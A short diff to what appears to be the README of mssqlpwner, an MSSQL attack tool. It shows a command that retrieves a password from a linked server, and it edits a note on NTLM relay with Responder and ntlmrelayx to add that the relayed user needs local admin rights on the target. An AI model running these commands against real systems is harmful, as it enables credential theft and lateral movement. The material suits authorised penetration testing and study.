@@ -214,7 +214,7 @@ Retrieving password from the linked server:
 - `mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrieve-password`
 
 ## NTLM Relay:
-*Note: three tools involved: Responder,ntlmrelayx and mssqlpwner/impacket*
+*Notes: three tools involved: Responder,ntlmrelayx and mssqlpwner/impacket, also, make sure the user authenticating to us have local admin access to the desired target*
 
 <ins>Set up NTLM Relay</ins>:
 
